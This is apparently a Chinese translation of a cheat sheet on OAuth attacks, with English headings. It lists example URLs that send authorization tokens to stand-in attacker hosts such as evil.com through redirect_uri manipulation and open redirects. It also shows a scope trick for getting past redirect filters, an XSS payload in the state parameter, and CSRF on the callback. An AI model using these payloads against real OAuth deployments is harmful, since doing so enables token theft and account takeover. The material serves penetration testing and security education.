# OAuth

## 摘要

- [Stealing OAuth Token via referer](#stealing-oauth-token-via-referer)
- [Grabbing OAuth Token via redirect_uri](#grabbing-oauth-token-via-redirect---uri)
- [Executing XSS via redirect_uri](#executing-xss-via-redirect---uri)
- [OAuth private key disclosure](#oauth-private-key-disclosure)
- [Authorization Code Rule Violation](#authorization-code-rule-violation)
- [Cross-Site Request Forgery](#cross-site-request-forgery)
- [References](#references)

## 通过HTTP头Referer窃取OAuth Token

From [@abugzlife1](https://twitter.com/abugzlife1/status/1125663944272748544) tweet.

> Do you have HTML injection but can't get XSS? Are there any OAuth implementations on the site? If so, setup an img tag to your server and see if there's a way to get the victim there (redirect, etc.) after login to steal OAuth tokens via referer 
>
> 你是否出现一种情况是存在HTML注入缺不能获得XSS？是否在这个网页上有很多OAuth实现？如果是这样，那你可以尝试在服务器页面上设置一个img标签，看看是否有办法在被害者登陆后（重定向等等的方法）来通过Referer窃取OAuth token

## 通过重定向uri来抓取OAuth token(redirect_uri)

重定向道可控域(可控服务器或者网站)来获得访问token

```powershell
https://www.example.com/signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful
https://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost.evil.com
```

重定向道一个允许的开放URL来获得访问token

```powershell
https://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com
https://www.example.com/oauth2/authorize?[...]&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F
```

OAuth实现不应该把整个域设置为白名单，只设置几个URL（需要用到的），这样“redirect_uri”就不能指向一个开放式重定向了。

又是需要讲作用域更改为无效的作用域(scope)来绕过重定向时的筛选器。

```powershell
https://www.example.com/admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com
```

## 通过redirect_uri来执行XSS

```powershell
https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script>
```

## 公开OAuth私钥

一些安卓/IOS的app可以被反编译，我们可以在里面找到OAuth私钥。

## 违反授权码规则

> 客户端禁止使用授权码超过一次。如果一个授权被使用超过一次，授权服务器必须禁止这个请求并且需要（在需要的情况下）撤销所有基于这个授权码的所有Token

## 跨站请求伪造

如果程序不在OAuth回调过程中检查CSRF令牌，那么这个程序可以被攻击。通过初始化OAuth流并且拦截回调(`https://example.com/callback?code=AUTHORIZATION_CODE`)。这个URL可以运用CSRF攻击

> 客户端需要为他们重定向URI进行CSRF保护。通常，这是通过要求发送到重定向URI端点的任何请求包括将请求绑定到用户代理的身份验证状态的值来实现的。当进行授权请求时，客户端应该利用“state”请求参数将这个值传递给授权服务器。

## References

* [All your Paypal OAuth tokens belong to me - localhost for the win - INTO THE SYMMETRY](http://blog.intothesymmetry.com/2016/11/all-your-paypal-tokens-belong-to-me.html)
* [OAuth 2 - How I have hacked Facebook again (..and would have stolen a valid access token) - INTO THE SYMMETRY](http://intothesymmetry.blogspot.ch/2014/04/oauth-2-how-i-have-hacked-facebook.html)
* [How I hacked Github again. - Egor Homakov](http://homakov.blogspot.ch/2014/02/how-i-hacked-github-again.html)
* [How Microsoft is giving your data to Facebook… and everyone else - Andris Atteka](http://andrisatteka.blogspot.ch/2014/09/how-microsoft-is-giving-your-data-to.html)

- [Bypassing Google Authentication on Periscope's Administration Panel](https://whitton.io/articles/bypassing-google-authentication-on-periscopes-admin-panel/) By Jack Whitton